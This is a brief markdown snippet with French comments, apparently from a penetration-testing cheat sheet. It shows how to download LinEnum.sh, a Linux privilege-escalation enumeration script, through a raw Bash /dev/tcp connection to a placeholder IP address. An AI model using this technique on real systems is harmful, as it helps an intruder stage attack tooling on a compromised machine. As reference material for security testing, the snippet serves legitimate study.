---
public: true # set to true to make the article publishable
---

## Bash (/dev/tcp)

```
# connection
exec 3<>/dev/tcp/1.2.3.4/80

# Envoie du HTTP GET
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3

# Affichage de la réponse
cat <&3
```